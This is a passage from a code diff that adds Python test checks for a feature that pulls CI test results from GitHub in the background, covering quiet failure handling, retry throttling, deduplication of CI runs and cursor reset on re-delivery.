+                  (_r38["delivery"] or {}).get("branch") == "br"
+                  and "pull/1" in ((_r38["delivery"] or {}).get("pull_request") or ""),
+                  "results appearing on their own with no stated source is a number changing "
+                  "for no visible reason")
+            check("...and the read still answers immediately",
+                  _r38["execution_status"] == "not_executed",
+                  "the pull is a daemon thread; a GitHub call a reader waits for would be a "
+                  "worse product than a report that arrives a moment later")
+
+            # Failure is the normal case here -- the repository above does not exist -- and
+            # what matters is that it stays invisible to the reader and is not retried on
+            # every single render.
+            _out38 = _tp38.pull_latest(_rid38)
+            check("a GitHub problem is recorded against the delivery, not raised",
+                  _out38["pulled"] is False and bool(_out38.get("why")),
+                  str(_out38)[:140])
+            _row38 = database.get_test_delivery(_rid38)
+            check("...with the reason kept where the screen can explain itself",
+                  bool(_row38.get("last_error")), str(_row38.get("last_error"))[:100])
+            check("...and the attempt timestamped, so it is not retried on every read",
+                  bool(_row38.get("last_fetch_at")),
+                  "without this an expired artifact would be re-requested forever")
+            check("...so the very next read declines",
+                  _tp38.pull_latest(_rid38)["why"] == "looked recently")
+
+            _r38 = _c38.get(f"/api/reviews/{_rid38}/test-results", headers=_H38).json()
+            check("the failed look reaches the screen as a note, not as an error",
+                  bool((_r38["delivery"] or {}).get("last_error"))
+                  and _r38["execution_status"] == "not_executed",
+                  "a background convenience that could not run must not become a red box")
+
+            # Filing the same CI run twice would show a suite passing twice as often as it
+            # ran, and the history is what a customer reads to decide whether their code
+            # works. Deduped on the record, not the bookkeeping, because a re-delivery
+            # deliberately clears the bookkeeping.
+            database.save_test_result_run(_rid38, _p38, {
+                "summary": {"total": 1, "passed": 1, "failed": 0, "errored": 0,
+                            "skipped": 0, "duration_ms": 1, "outcome": "passed"},
+                "results": [{"name": "test_a", "status": "passed", "duration_ms": 1}],
+                "requirements": [], "unmatched_results": 0, "reported_by": "auto-fetch",
+                "reported_at": "now", "source_label": "GitHub Actions run 999 (o/r)"})
+            check("a report already filed for a CI run is recognised",
+                  _tp38._already_filed(_rid38, "999"),
+                  "keyed on the stored report rather than on a cursor, because a "
+                  "re-delivery resets the cursor on purpose")
+            check("...and one from a different run is not",
+                  not _tp38._already_filed(_rid38, "1000"))
+
+            database.save_test_delivery(_rid38, _p38, "https://github.com/o/other", "br2")
+            _reset38 = database.get_test_delivery(_rid38)
+            check("re-delivering somewhere else clears the cursor",
+                  not _reset38.get("last_run_id") and not _reset38.get("last_fetch_at"),
+                  "a new target is a new place to look, and the last run seen at the old one "
+                  "must not suppress the first look at this one")
+        finally:
+            llm_gateway.call_tool = _prev38
+
+
+
+
+
     print()
     print("-" * 60)
     if FAILED:
